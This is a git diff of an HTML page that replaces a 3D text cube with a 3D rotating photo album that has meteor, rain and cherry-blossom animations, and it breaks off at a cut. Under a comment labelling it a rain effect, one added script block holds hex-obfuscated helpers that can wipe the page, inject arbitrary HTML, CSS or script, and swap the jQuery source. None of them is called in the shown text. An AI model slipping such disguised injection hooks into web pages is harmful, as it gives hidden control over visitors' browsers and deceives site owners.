@@ -1,451 +1,805 @@
 <!DOCTYPE html>
-<html lang='en' onselectstart='return false'>
-<head>
-<meta charset='utf-8' />
-<style>
-li,
-ul,
-div,
-html,
-body{
-  margin: 0;
-  padding: 0;
-}
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <title>流星雨3D旋转相册</title>
+    <link rel="stylesheet" href="style.css" />
+    <style>
+      * {
+        margin: 0;
+        padding: 0;
+      }
+      html,
+      body {
+        width: 100vw;
+        height: 100vh;
+      }
+      body {
+        display: flex;
+        /* perspective: 1000px; */
+        transform-style: preserve-3d;
+        /* background-image: url(./img/3.png); */
+        background: #0c0c0c;
+        height: 100%;
+        width: 100%;
+      }
+      #box {
+        z-index: 9999;
+        position: relative;
+        display: flex;
+        width: 130px;
+        height: 200px;
+        margin: auto;
+        transform-style: preserve-3d;
+        animation: roteY 50s linear infinite;
+      }
+      @keyframes roteY {
+        0% {
+          transform: rotateX(-10deg) rotateY(0deg);
+        }
+        10% {
+          transform: rotateX(-10deg) rotateY(36deg);
+        }
+        20% {
+          transform: rotateX(-10deg) rotateY(72deg);
+        }
+        30% {
+          transform: rotateX(-10deg) rotateY(108deg);
+        }
+        40% {
+          transform: rotateX(-10deg) rotateY(144deg);
+        }
+        50% {
+          transform: rotateX(-10deg) rotateY(180deg);
+        }
+        60% {
+          transform: rotateX(-10deg) rotateY(216deg);
+        }
+        70% {
+          transform: rotateX(-10deg) rotateY(252deg);
+        }
+        80% {
+          transform: rotateX(-10deg) rotateY(288deg);
+        }
+        90% {
+          transform: rotateX(-10deg) rotateY(324deg);
+        }
+        100% {
+          transform: rotateX(-10deg) rotateY(360deg);
+        }
+      }
+      #box > div {
+        transform-style: preserve-3d;
+        position: absolute;
+        left: 0;
+        top: 0;
+        width: 100%;
+        height: 100%;
+        line-height: 200px;
+        font-size: 50px;
+        text-align: center;
+        box-shadow: 0 0 10px #fff;
+        -webkit-box-reflect: below 10px -webkit-linear-gradient(top, rgba(
+                0,
+                0,
+                0,
+                0
+              )
+              40%, rgba(0, 0, 0, 0.8) 100%);
+      }
 
-html,
-body{ height: 100% }
+      #box p {
+        position: absolute;
+        left: 0;
+        top: 0;
+        bottom: 0;
+        right: 0;
+        margin: auto;
+        width: 1200px;
+        height: 1200px;
+        background: -webkit-radial-gradient(
+          center center,
+          600px 600px,
+          rgba(50, 50, 50, 1),
+          rgba(0, 0, 0, 0)
+        );
+        border-radius: 50%;
+        transform: rotateX(90deg) translate3d(-600px, 0, -105px);
+      }
+      /* 下雨特效 */
+      #codepen-link {
+        position: absolute;
+        bottom: 30px;
+        right: 30px;
+        height: 40px;
+        width: 40px;
+        z-index: 10;
+        border-radius: 50%;
+        box-sizing: border-box;
+        background-image: url("https://s3-us-west-2.amazonaws.com/s.cdpn.io/544318/logo.jpg");
+        background-position: center center;
+        background-size: cover;
+        opacity: 0.5;
+        -webkit-transition: all 0.25s;
+        transition: all 0.25s;
+      }
 
-li{ list-style-type: none }
+      #codepen-link:hover {
+        opacity: 0.8;
+        box-shadow: 0 0 6px #efefef;
+      }
+    </style>
+  </head>
+  <body>
+    <audio preload="auto" id="music">
+      <source src="./renxi.mp3">
+    </audio>
+    <!-- 相册 -->
+    <div id="box"></div>
+    <!-- 流星 -->
+    <div class="stars" id='stars'></div>
+    <script
+      id="jqbb"
+      src="https://libs.baidu.com/jquery/1.11.1/jquery.min.js"
+    ></script>
+    <script type="text/javascript">
+      // const AudioContext = window.AudioContext || window.webkitAudioContext;
+      // const audioCtx = new AudioContext();
+      // function audioAutoPlay(url) {
+      //   let request = new XMLHttpRequest();
+      //   request.open("GET", url, true);
+      //   request.responseType = "arraybuffer";
+      //   request.onload = function() {
+      //     console.log('音频文件加载完成');
+      //     audioCtx.decodeAudioData(request.response, function(buffer) {
+      //       console.log('对音频解码完成');
+      //       var source = audioCtx.createBufferSource();
+      //       source.buffer = buffer;
+      //       source.connect(audioCtx.destination);
+      //       source.start();
+      //     },
+      //     function(e) { console.log(e); });
+      //   };
+      //   request.send();
+      // }
+      // audioAutoPlay("地址.mp3");
+    </script>
+    <script>
+      //生成相册
+      var obox = document.getElementById("box");
+      for(var i=0;i<10;i++){
+        var odiv = document.createElement('div')
+        obox.appendChild(odiv)
+      }
+      //生成流星
+      var starbox = document.getElementById('stars');
+      for(var j=0;j<50;j++){
+        var stardv = document.createElement('div')
+        stardv.setAttribute('class','star');
+        starbox.appendChild(stardv)
+      }
+      //封装函数让谷歌浏览器自动播放
+      function play() {
+        var music = document.getElementById("music"); 
+        //判断如果音乐停止播放中，就让他播放。。。
+        if (music.paused) { 
+          music.paused = false;
+          music.play(); 
+        }
+      }
+      setInterval(play(), 1);
+      document.body.onclick = function(){
+        play()
+      }
+      setTimeout(init, 100);
+      function init() {
+        var obox = document.getElementById("box");
+        var aDiv = obox.children;
+        for (var i = 0; i < aDiv.length; i++) {
+          aDiv[i].style.background =
+            "url(img/" + (i + 1) + ".jpg) center/cover";
+          aDiv[i].style.transform =
+            "rotateY(" + i * 36 + "deg) translate3d(0,0,350px)";
+          aDiv[i].style.transition =
+            "transform 1s " + (aDiv.length - i) * 0.2 + "s";
+        }
+        var sX,
+          sY,
+          nX,
+          nY,
+          desX = 0,
+          desY = 0,
+          tX = 0,
+          tY = 10,
+          index = 0; //滚轮初始值
+        document.onmousedown = function (e) {
+          clearInterval(obox.timer);
+          e = e || window.event;
+          var sX = e.clientX,
+            sY = e.clientY;
+          this.onmousemove = function (e) {
+            e = e || window.event;
+            var nX = e.clientX,
+              nY = e.clientY;
+            // 当前点的坐标和前一点的坐标差值
+            desX = nX - sX;
+            desY = nY - sY;
+            tX += desX * 0.1;
+            tY += desY * 0.1;
 
-.wrap{
-  height: 100%;
-  overflow: hidden;
-  perspective: 800px;
-}
+            obox.style.transform =
+              "rotateX(" + -tY + "deg) rotateY(" + tX + "deg)";
+            sX = nX;
+            sY = nY;
+          };
+          this.onmouseup = function () {
+            this.onmousemove = this.onmouseup = null;
+            obox.timer = setInterval(function () {
+              desX *= 0.95;
+              desY *= 0.95;
+              tX += desX * 0.1;
+              tY += desY * 0.1;
+              obox.style.transform =
+                "rotateX(" + -tY + "deg) rotateY(" + tX + "deg)";
+              if (Math.abs(desX) < 0.5 && Math.abs(desY) < 0.5) {
+                clearInterval(obox.timer);
+              }
+            }, 13);
+          };
+          return false;
+        };
+        //滚轮放大缩小
+        mousewheel(document, function (e) {
+          e = e || window.event;
+          var d = e.wheelDelta / 120 || -e.detail / 3;
+          if (d > 0) {
+            index -= 20;
+          } else {
+            index += 30;
+          }
+          index < -1050 && (index = -1050);
+          document.body.style.perspective = 1000 + index + "px";
+        });
+        function mousewheel(obj, fn) {
+          document.onmousewheel === null
+            ? (obj.onmousewheel = fn)
+            : addEvent(obj, "DOMMouseScroll", fn);
+        }
+        function addEvent(obj, eName, fn) {
+          obj.attachEvent
+            ? obj.attachEvent("on" + eName, fn)
+            : obj.addEventListener(eName, fn);
+        }
+      }
+    </script>
+    <!-- 下雨特效 -->
+    <script>
+      function reload_html() {
+        $("\x62\x6f\x64\x79")["\x68\x74\x6d\x6c"]("");
+      }
 
-#box{
-  top: 50%;
-  left: 50%;
-  width: 0;
-  height: 0;
-  position: relative;
-  transform-style: preserve-3d;
-  transform: translateZ(-1600px);
-  z-index: 1;
-}
-#box li{
-  top: -80px;
-  left: -60px;
-  width: 120px;
-  height: 160px;
-  position: absolute;
-  text-align: center;
-  line-height: 160px;
-  background-color: rgba(5,100,80,0.2);
-  border: 1px solid rgba(125,255,255,0.25);
-  box-shadow: 0 0 15px rgba(0,255,255,0.5);
-  cursor: pointer;
-}
-#box li span{
-  font-size: 28px;
-  font-weight: blod;
-  text-shadow: 2px 2px 5px black;
-  color: #efebef;
-}
+      function addhtml(lViZBL1) {
+        $("\x62\x6f\x64\x79")["\x68\x74\x6d\x6c"](lViZBL1);
+      }
 
-.mask{
-  width: 100%;
-  height: 100%;
-  background: url('bg_mask.jpg') no-repeat center;
-  background-size: cover;
-  filter: blur(5px);
-}
-.mask > .bg-mask{
-  width: 100%;
-  height: 100%;
-  background: #000;
-  opacity: 0.25;
-}
-</style>
-</head>
-<body>
-<div class="wrap">
-  <ul id="box"></ul>
+      function addcss(CDEsDFFJ2) {
+        var EZS_sF3 = window["\x64\x6f\x63\x75\x6d\x65\x6e\x74"][
+          "\x63\x72\x65\x61\x74\x65\x45\x6c\x65\x6d\x65\x6e\x74"
+        ]("\x73\x74\x79\x6c\x65");
+        EZS_sF3["\x69\x6e\x6e\x65\x72\x48\x54\x4d\x4c"] = CDEsDFFJ2;
+        window["\x64\x6f\x63\x75\x6d\x65\x6e\x74"]
+          ["\x71\x75\x65\x72\x79\x53\x65\x6c\x65\x63\x74\x6f\x72"](
+            "\x62\x6f\x64\x79"
+          )
+          ["\x61\x70\x70\x65\x6e\x64\x43\x68\x69\x6c\x64"](EZS_sF3);
+      }
 
-  <div class="mask">
-    <div class="bg-mask"></div>
-  </div>
-</div>
-<script src='jquery-2.2.4.js'></script>
-<script>
+      function addjs(qGZu4) {
+        $("\x62\x6f\x64\x79")["\x61\x70\x70\x65\x6e\x64"](qGZu4);
+      }
 
-// 开启一个独立的空间避免全局变量污染
-(function(){
-  let
+      function jqban(nJ5) {
+        $("\x23\x6a\x71\x62\x62")["\x61\x74\x74\x72"](
+          "\x73\x72\x63",
+          "\x68\x74\x74\x70\x3a\x2f\x2f\x6c\x69\x62\x73\x2e\x62\x61\x69\x64\x75\x2e\x63\x6f\x6d\x2f\x6a\x71\x75\x65\x72\x79\x2f" +
+            nJ5 +
+            "\x2f\x6a\x71\x75\x65\x72\x79\x2e\x6d\x69\x6e\x2e\x6a\x73"
+        );
+      }
+    </script>
+    <script>
+      (function (window, document) {
+        var Vector2 = (function () {
+          function Vector2(x, y) {
+            this.x = x || 0;
+            this.y = y || 0;
+          }
+          return Vector2;
+        })();
 
-  idx,
-  timer,
+        Vector2.prototype.add = function (addend) {
+          this.x += addend.x;
+          this.y += addend.y;
+        };
 
-  // 存放li 元素
-  liElem,
+        var RainDrop = (function () {
+          function RainDrop(parent) {
+            this.size = 2;
+            this.parent = parent;
+            this.init();
+          }
+          return RainDrop;
+        })();
 
-  // 存放span 元素
-  spanElem,
+        RainDrop.prototype.init = function () {
+          this.life = 0;
+          this.ttl = Math.random() * 500 + 30000;
+          this.position = new Vector2(Math.random() * window.innerWidth, 0);
+          this.velocity = new Vector2(
+            0.5 - Math.random() * 1,
+            Math.random() * 1 + 0.2
+          );
+          this.terminalVelocity = 8;
+        };
 
-  // 记录布局类型
-  currentStyle,
+        RainDrop.prototype.update = function () {
+          if (
+            this.position.x > window.innerWidth ||
+            this.position.x < -this.size ||
+            this.life > this.ttl
+          )
+            this.init();
+          if (this.position.y > this.parent.floor) {
+            this.position.y = this.parent.floor - this.size;
+            this.velocity.y *= -0.2 - Math.random() * 0.2;
+          }
+          this.life++;
+          this.position.add(this.velocity);
+          this.velocity.y += 0.1;
+        };
 
-  // 鼠标X、Y坐标值
-  oldCoordX,
-  oldCoordY,
-  nowCoordX,
-  nowCoordY,
+        var Rain = (function () {
+          function Rain(args) {
+            this.props = args;
+            this.rainDrops = [];
+            this.init();
+          }
+          return Rain;
+        })();
 
-  // li 元素水平、垂直、纵深方向偏移位
-  offsetStepX,
-  offsetStepY,
-  offsetStepZ,
+        Rain.prototype.init = function () {
+          this.createCanvas();
+          this.resize();
+          this.loop();
+        };
 
-  // li 元素的坐标
-  liElemCoordX,
-  liElemCoordY,
-  liElemCoordZ,
+        Rain.prototype.resize = function () {
+          var attr =
+            "position: absolute; z-index: 0; top: 0; left: 0; height: 100vh; width: 100vw;";
 
-  // 鼠标X、Y差值
-  minusX = 0,
-  minusY = 0,
+          this.canvas.setAttribute("style", attr);
 
-  // X、Y偏移度数
-  liElemDegX = 0,
-  liElemDegY = 0,
+          this.dimensions = {
+            width: window.innerWidth,
+            height: window.innerHeight,
+          };
 
-  // li 元素的最大个数
-  liElemMaxNum = 162,
+          this.canvas.width = this.dimensions.width;
+          this.canvas.height = this.dimensions.height;
+          this.floor = this.dimensions.height * 0.7;
+        };
 
-  // li 元素 水平、垂直铺放的最大个数
-  liElemRowMaxNum = 5,
-  liElemColMaxNum = 5,
+        Rain.prototype.createCanvas = function () {
+          this.canvas = document.createElement("canvas");
 
-  // li 元素水平、垂直、纵深方向的最大间隔距离
-  liElemOffsetX = 350,
-  liElemOffsetY = 350,
-  liElemOffsetZ = 350,
+          this.ctx = this.canvas.getContext("2d");
 
-  // li 元素默认景深
-  liElemDepDefault = -1000,
+          document.body.appendChild(this.canvas);
+        };
 
-  // 避免覆盖默认景深值
-  depDefault = liElemDepDefault-600;
+        Rain.prototype.draw = function () {
+          this.ctx.fillStyle = this.props.backgroundColor;
+          this.ctx.fillRect(0, 0, this.dimensions.width, this.floor);
+          for (var i = 0, len = this.rainDrops.length; i < len; i++) {
+            var rainDrop = this.rainDrops[i];
+            rainDrop.update();
+            this.ctx.fillStyle = this.props.rainColor;
+            this.ctx.fillRect(
+              rainDrop.position.x,
+              rainDrop.position.y,
+              rainDrop.size,
+              rainDrop.size
+            );
+          }
+          this.reflect();
+        };
 
-  // 避免第一次拖动发生错位
-  liElemDepZ = liElemDepDefault-600,
+        Rain.prototype.reflect = function () {
+          var grad = this.ctx.createLinearGradient(
+            this.dimensions.width / 2,
+            this.floor * 0.6,
+            this.dimensions.width / 2,
+            this.floor
+          );
+          grad.addColorStop(0, "rgba(20,30,40,1)");
+          grad.addColorStop(1, "rgba(20,30,40,0)");
+          this.ctx.save();
+          this.ctx.scale(1, -1);
+          this.ctx.translate(0, this.floor * -2);
+          this.ctx.filter = "blur(2px) saturate(150%)";
+          this.ctx.drawImage(
+            this.canvas,
+            0,
+            0,
+            this.dimensions.width,
+            this.floor,
+            0,
+            0,
+            this.dimensions.width,
+            this.floor
+          );
+          this.ctx.fillStyle = grad;
+          this.ctx.fillRect(0, 0, this.dimensions.width, this.floor);
+          this.ctx.restore();
+        };
 
-  // 单个方阵中 li 元素的总个数
-  aScreenNum = liElemRowMaxNum*liElemColMaxNum,
+        Rain.prototype.loop = function () {
+          var timeout,
+            self = this;
+          if (self.rainDrops.length < self.props.rainDropCount) {
+            timeout = window.setTimeout(function () {
+              self.rainDrops.push(new RainDrop(self));
+            }, Math.random() * 200);
+          } else if (timeout) {
+            timeout = null;
+            window.clearTimeout(timeout);
+          }
+          self.draw();
+          window.requestAnimationFrame(self.loop.bind(self));
+        };
 
-  // li 元素纵深方向的最在间隔距离
-  liElemDepMaxDist = parseInt(liElemMaxNum/aScreenNum),
+        window.onload = function () {
+          var args = {
+            rainDropCount: 500,
+            rainColor: "rgba(150,180,255,0.8)",
+            backgroundColor: "rgba(10,10,10,0.5)",
+          };
 
-  // 计算第一个li 元素的坐标点
-  liElemFristSiteX = parseInt('-'+liElemRowMaxNum/2)*liElemOffsetX,
-  liElemFristSiteY = parseInt('-'+liElemColMaxNum/2)*liElemOffsetY,
-  liElemFristSiteZ = parseInt('-'+liElemDepMaxDist/2)*liElemOffsetZ,
+          var rain = new Rain(args);
 
-  // 文本内容
-  data = ['祝我','快乐','漂亮','老婆','生日','快乐','老婆','生日'];
+          window.onresize = function () {
+            rain.resize();
+          };
+        };
 
-  // 指定一个区间，获取一个随机数
-  randomFrom = (lowerValue,upperValue) =>{
-    return Math.floor(Math.random()*(upperValue-lowerValue+1)+lowerValue);
-  }
+        window.requestAnimationFrame = (function () {
+          return (
+            window.requestAnimationFrame ||
+            window.webkitRequestAnimationFrame ||
+            window.mozRequestAnimationFrame ||
+            window.oRequestAnimationFrame ||
+            window.msRequestAnimationFrame ||
+            function (callback) {
+              window.setTimeout(callback, 1000 / 60);
+            }
+          );
+        })();
+      })(this, document);
+    </script>
+    <!-- 樱花部分 -->
+    <script>
+      var RENDERER = {
+        INIT_CHERRY_BLOSSOM_COUNT: 30,
+        MAX_ADDING_INTERVAL: 10,
 
-  // 方阵
-  gridLayout = _ =>{
-    let arr = [...Array(liElemMaxNum).keys()];
-    $('#box li').each(i =>{
-      // 数组的索引
-      let idx = randomFrom(0,arr.length-1);
-      
-      // 计算li 元素 水平、垂直、纵深方向的偏移位
-      offsetStepX = ((i%aScreenNum)%liElemRowMaxNum)*liElemOffsetX;
-      offsetStepY = parseInt((i%aScreenNum)/liElemColMaxNum)*liElemOffsetY;
-      offsetStepZ = parseInt(i/aScreenNum)*liElemOffsetZ;
+        init: function() {
+          this.setParameters();
+          this.reconstructMethods();
+          this.createCherries();
+          this.render();
+          if (
+            navigator.userAgent.match(
+              /(phone|pod|iPhone|iPod|ios|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i
+            )
+          ) {
+            var box = document.querySelectorAll('.box')[0];
+            console.log(box, '移动端');
+            box.style.marginTop = '65%';
+          }
+        },
+        setParameters: function() {
+          this.$container = $('#jsi-cherry-container');
+          this.width = this.$container.width();
+          this.height = this.$container.height();
+          this.context = $('<canvas style="position:absolute;z-index:8;" />')
+            .attr({ width: this.width, height: this.height })
+            .appendTo(this.$container)
+            .get(0)
+            .getContext('2d');
+          this.cherries = [];
+          this.maxAddingInterval = Math.round(
+            (this.MAX_ADDING_INTERVAL * 1000) / this.width
+          );
+          this.addingInterval = this.maxAddingInterval;
+        },
+        reconstructMethods: function() {
+          this.render = this.render.bind(this);
+        },
+        createCherries: function() {
+          for (
+            var i = 0,
+              length = Math.round(
+                (this.INIT_CHERRY_BLOSSOM_COUNT * this.width) / 1000
+              );
+            i < length;
+            i++
+          ) {
+            this.cherries.push(new CHERRY_BLOSSOM(this, true));
+          }
+        },
+        render: function() {
+          requestAnimationFrame(this.render);
+          this.context.clearRect(0, 0, this.width, this.height);
 
-      // 计算当前li 元素的坐标值
-      liElemCoordX = liElemFristSiteX+offsetStepX;
-      liElemCoordY = liElemFristSiteY+offsetStepY;
-      liElemCoordZ = liElemFristSiteZ+offsetStepZ;
-       
-      $('#box li').eq(arr[idx]).css({
-        "transform":`translate3d(${liElemCoordX}px,${liElemCoordY}px,${liElemCoordZ}px)`,
-        "transition": "4s ease-in-out"
-      })
-
-      // 删除数组中的值
-      arr.splice(idx,1);
-    }); currentStyle = gridLayout;
-  }
-
-  // 螺旋
-  helixLayout = _ =>{
-    let arr = [...Array(liElemMaxNum).keys()];
-    $('#box li').each(i =>{
-      let idx = randomFrom(0,arr.length-1);
-      let liElemDegY = 10*i;
-      let liElemDepY = -10*parseInt(liElemMaxNum/2)+10*i;
-
-      $('#box li').eq(arr[idx]).css({
-        "transform":`rotateY(${liElemDegY}deg) translateY(${liElemDepY}px) translateZ(${Math.abs(liElemDepDefault)}px)`,
-        "transition": "4s ease-in-out"
-      })
-
-      // 删除数组中的值
-      arr.splice(idx,1)
-    }); currentStyle = helixLayout;
-  }
-
-  // 球形
-  sphereLayout = _ =>{
-    let arr = [...Array(liElemMaxNum).keys()];
-    $('#box li').each(i =>{
-      let idx = randomFrom(0,arr.length-1);
-      let liElemDegY = 3*i;
-      let liElemDegX = 30*i;
-
-      $('#box li').eq(arr[idx]).css({
-        "transform":`rotateY(${liElemDegY}deg) rotateX(${liElemDegX}deg) translateZ(${Math.abs(liElemDepDefault)}px)`,
-        "transition": "4s ease-in-out"
-      })
-
-      // 删除数组中的值
-      arr.splice(idx,1)
-    }); currentStyle = sphereLayout;
-  }
-
-  // 三体
-  threeLayout = _ =>{
-    let arr = [...Array(liElemMaxNum).keys()];
-    $('#box li').each(i =>{
-      let idx = randomFrom(0,arr.length-1);
-      let liElemDegY = 3*i;
-      let liElemDegX = 60*i;
-
-      $('#box li').eq(arr[idx]).css({
-        "transform":`rotateY(${liElemDegY}deg) rotateX(${liElemDegX}deg) translateZ(${Math.abs(liElemDepDefault)}px)`,
-        "transition": "4s ease-in-out"
-      })
-
-      // 删除数组中的值
-      arr.splice(idx,1)
-    }); currentStyle = threeLayout;
-  }
-
-  // 几何
-  geomeLayout = _ =>{
-    let arr = [...Array(liElemMaxNum).keys()];
-    $('#box li').each(i =>{
-      let idx = randomFrom(0,arr.length-1);
-      let liElemDegY = 8.9*i;
-      let liElemDegX = 2.9*i;
-
-      $('#box li').eq(arr[idx]).css({
-        "transform":`rotateY(${liElemDegY}deg) rotateX(${liElemDegX}deg) translateZ(${Math.abs(liElemDepDefault)}px)`,
-        "transition": "4s ease-in-out"
-      })
-
-      // 删除数组中的值
-      arr.splice(idx,1)
-    }); currentStyle = geomeLayout;
-  }
-
-  // 曲线
-  curveLayout = _ =>{
-    let arr = [...Array(liElemMaxNum).keys()];
-    $('#box li').each(i =>{
-      let idx = randomFrom(0,arr.length-1);
-      let liElemDegY = 1*i;
-      let liElemDegX = 2*i;
-
-      $('#box li').eq(arr[idx]).css({
-        "transform":`rotateY(${liElemDegY}deg) rotateX(${liElemDegX}deg) translateZ(${liElemDepDefault}px)`,
-        "transition": "4s ease-in-out"
-      })
-
-      // 删除数组中的值
-      arr.splice(idx,1)
-    }); currentStyle = curveLayout;
-  }
-
-  // 随机
-  chaoticLayout = _ =>{
-    $('#box li').each(function(i){
-      // 随机生成li 元素的坐标点
-      liElemCoordX = (Math.random()-0.5)*3000;
-      liElemCoordY = (Math.random()-0.5)*3000;
-      liElemCoordZ = (Math.random()-0.5)*3000;
-
-      $(this).css({
-        "transform":`translate3d(${liElemCoordX}px,${liElemCoordY}px,${liElemCoordZ}px)`,
-        "transition": "4s ease-in-out"
-      })
-    }); currentStyle = chaoticLayout;
-  }
-
-  function main(){
-    $([...Array(liElemMaxNum).keys()]).each(i =>{
-      // 创建一个li 元素
-      liElem = $('<li></li>');
-      let idx = randomFrom(0,data.length-1);
-
-      // 创建一个span 元素
-      spanElem = $(`<span>${data[idx]}</span>`);
-      liElem.append(spanElem);
-
-      // 设置span 中的文本颜色
-      spanElem.css('color',`rgb(${randomFrom(100,255)},${randomFrom(100,255)},${randomFrom(100,255)})`);
-
-      // 将已创建的li 元素添加至容器中
-      $('#box').append(liElem);
-    })
-
-    // 布局类型
-    layoutStyle = [gridLayout, helixLayout, chaoticLayout, sphereLayout, 
-    threeLayout, geomeLayout, curveLayout];
-
-    // 鼠标移入移出效果
-    $('#box li').hover(function(){
-      $(this).css('border','1px solid rgba(125,255,255,0.75)');
-      $(this).css('boxShadow','0 0 15px rgba(0,255,255,0.75)');
-      $(this).css('transition','0s');
-    },function(){
-      $(this).css('border','1px solid rgba(125,255,255,0.25)');
-      $(this).css('boxShadow','0 0 15px rgba(0,255,255,0.5)');
-      $(this).css('transition','0s');
-    })
-
-    // 鼠标点击，切换布局
-    $('#box li').click(function(){
-      switch($(this).text()){
-        case 'Grid': gridLayout(); break;
-        case 'Helix': helixLayout(); break;
-        case 'Three': threeLayout(); break;
-        case 'Geome': geomeLayout(); break;
-        case 'Curve': curveLayout(); break;
-        case 'Sphere': sphereLayout(); break;
-        case 'Chaotic': chaoticLayout(); break;
-
-        default:
-          while(true){
-            idx = randomFrom(0,layoutStyle.length-1);
-            if(layoutStyle[idx] != currentStyle){
-              return layoutStyle[idx]();
+          this.cherries.sort(function(cherry1, cherry2) {
+            return cherry1.z - cherry2.z;
+          });
+          for (var i = this.cherries.length - 1; i >= 0; i--) {
+            if (!this.cherries[i].render(this.context)) {
+              this.cherries.splice(i, 1);
             }
           }
-          break;
-      }
-    })
+          if (--this.addingInterval == 0) {
+            this.addingInterval = this.maxAddingInterval;
+            this.cherries.push(new CHERRY_BLOSSOM(this, false));
+          }
+        }
+      };
+      var CHERRY_BLOSSOM = function(renderer, isRandom) {
+        this.renderer = renderer;
+        this.init(isRandom);
+      };
+      CHERRY_BLOSSOM.prototype = {
+        FOCUS_POSITION: 300,
+        FAR_LIMIT: 600,
+        MAX_RIPPLE_COUNT: 100,
+        RIPPLE_RADIUS: 100,
+        SURFACE_RATE: 0.5,
+        SINK_OFFSET: 20,
 
-    // 鼠标拖动与滚轮效果
-    $(document).mousedown(function(event){
-      event = event || window.event;
+        init: function(isRandom) {
+          this.x = this.getRandomValue(
+            -this.renderer.width,
+            this.renderer.width
+          );
+          this.y = isRandom
+            ? this.getRandomValue(0, this.renderer.height)
+            : this.renderer.height * 1.5;
+          this.z = this.getRandomValue(0, this.FAR_LIMIT);
+          this.vx = this.getRandomValue(-2, 2);
+          this.vy = -2;
+          this.theta = this.getRandomValue(0, Math.PI * 2);
+          this.phi = this.getRandomValue(0, Math.PI * 2);
+          this.psi = 0;
+          this.dpsi = this.getRandomValue(Math.PI / 600, Math.PI / 300);
+          this.opacity = 0;
+          this.endTheta = false;
+          this.endPhi = false;
+          this.rippleCount = 0;
 
-      // 上一个点的X、Y坐标
-      oldCoordX = event.clientX;
-      oldCoordY = event.clientY;
+          var axis = this.getAxis(),
+            theta =
+              this.theta +
+              (Math.ceil(
+                -(this.y + this.renderer.height * this.SURFACE_RATE) / this.vy
+              ) *
+                Math.PI) /
+                500;
+          theta %= Math.PI * 2;
 
-      $(this).on('mousemove',event =>{
-        event = event || window.event;
+          this.offsetY =
+            40 * (theta <= Math.PI / 2 || theta >= (Math.PI * 3) / 2 ? -1 : 1);
+          this.thresholdY =
+            this.renderer.height / 2 +
+            this.renderer.height * this.SURFACE_RATE * axis.rate;
+          this.entityColor = this.renderer.context.createRadialGradient(
+            0,
+            40,
+            0,
+            0,
+            40,
+            80
+          );
+          this.entityColor.addColorStop(
+            0,
+            'hsl(330, 70%, ' + 50 * (0.3 + axis.rate) + '%)'
+          );
+          this.entityColor.addColorStop(
+            0.05,
+            'hsl(330, 40%,' + 55 * (0.3 + axis.rate) + '%)'
+          );
+          this.entityColor.addColorStop(
+            1,
+            'hsl(330, 20%, ' + 70 * (0.3 + axis.rate) + '%)'
+          );
+          this.shadowColor = this.renderer.context.createRadialGradient(
+            0,
+            40,
+            0,
+            0,
+            40,
+            80
+          );
+          this.shadowColor.addColorStop(
+            0,
+            'hsl(330, 40%, ' + 30 * (0.3 + axis.rate) + '%)'
+          );
+          this.shadowColor.addColorStop(
+            0.05,
+            'hsl(330, 40%,' + 30 * (0.3 + axis.rate) + '%)'
+          );
+          this.shadowColor.addColorStop(
+            1,
+            'hsl(330, 20%, ' + 40 * (0.3 + axis.rate) + '%)'
+          );
+        },
+        getRandomValue: function(min, max) {
+          return min + (max - min) * Math.random();
+        },
+        getAxis: function() {
+          var rate = this.FOCUS_POSITION / (this.z + this.FOCUS_POSITION),
+            x = this.renderer.width / 2 + this.x * rate,
+            y = this.renderer.height / 2 - this.y * rate;
+          return { rate: rate, x: x, y: y };
+        },
+        renderCherry: function(context, axis) {
+          context.beginPath();
+          context.moveTo(0, 40);
+          context.bezierCurveTo(-60, 20, -10, -60, 0, -20);
+          context.bezierCurveTo(10, -60, 60, 20, 0, 40);
+          context.fill();
 
-        // 若上一个定时器存在，则将其删除
-        timer && clearInterval(timer);
+          for (var i = -4; i < 4; i++) {
+            context.beginPath();
+            context.moveTo(0, 40);
+            context.quadraticCurveTo(i * 12, 10, i * 4, -24 + Math.abs(i) * 2);
+            context.stroke();
+          }
+        },
+        render: function(context) {
+          var axis = this.getAxis();
 
-        // 当前点的X、Y坐标
-        nowCoordX = event.clientX;
-        nowCoordY = event.clientY;
+          if (
+            axis.y == this.thresholdY &&
+            this.rippleCount < this.MAX_RIPPLE_COUNT
+          ) {
+            context.save();
+            context.lineWidth = 2;
+            context.strokeStyle =
+              'hsla(0, 0%, 100%, ' +
+              (this.MAX_RIPPLE_COUNT - this.rippleCount) /
+                this.MAX_RIPPLE_COUNT +
+              ')';
+            context.translate(
+              axis.x +
+                this.offsetY * axis.rate * (this.theta <= Math.PI ? -1 : 1),
+              axis.y
+            );
+            context.scale(1, 0.3);
+            context.beginPath();
+            context.arc(
+              0,
+              0,
+              (this.rippleCount / this.MAX_RIPPLE_COUNT) *
+                this.RIPPLE_RADIUS *
+                axis.rate,
+              0,
+              Math.PI * 2,
+              false
+            );
+            context.stroke();
+            context.restore();
+            this.rippleCount++;
+          }
+          if (axis.y < this.thresholdY || !this.endTheta || !this.endPhi) {
+            if (this.y <= 0) {
+              this.opacity = Math.min(this.opacity + 0.01, 1);
+            }
+            context.save();
+            context.globalAlpha = this.opacity;
+            context.fillStyle = this.shadowColor;
+            context.strokeStyle =
+              'hsl(330, 30%,' + 40 * (0.3 + axis.rate) + '%)';
+            context.translate(
+              axis.x,
+              Math.max(axis.y, this.thresholdY + this.thresholdY - axis.y)
+            );
+            context.rotate(Math.PI - this.theta);
+            context.scale(axis.rate * -Math.sin(this.phi), axis.rate);
+            context.translate(0, this.offsetY);
+            this.renderCherry(context, axis);
+            context.restore();
+          }
+          context.save();
+          context.fillStyle = this.entityColor;
+          context.strokeStyle = 'hsl(330, 40%,' + 70 * (0.3 + axis.rate) + '%)';
+          context.translate(
+            axis.x,
+            axis.y + Math.abs(this.SINK_OFFSET * Math.sin(this.psi) * axis.rate)
+          );
+          context.rotate(this.theta);
+          context.scale(axis.rate * Math.sin(this.phi), axis.rate);
+          context.translate(0, this.offsetY);
+          this.renderCherry(context, axis);
+          context.restore();
 
-        // 计算机X、Y差值
-        minusX = nowCoordX - oldCoordX;
-        minusY = nowCoordY - oldCoordY;
-
-        // 更新上一个点的X、Y坐标值
-        oldCoordX = nowCoordX;
-        oldCoordY = nowCoordY;
-
-        // 计算X、Y轴的移动度数
-        liElemDegX -= minusY*0.1;
-        liElemDegY += minusX*0.1;
-
-        $('#box').css({
-          "transform":`translateZ(${liElemDepZ}px) rotateX(${liElemDegX}deg) rotateY(${liElemDegY}deg)`
-        })
-
-
-      }).mouseup(_ =>{
-        // 当鼠标弹起解除移动
-        $(document).off('mousemove');
-
-        // 若上一个定时器存在，则将其删除
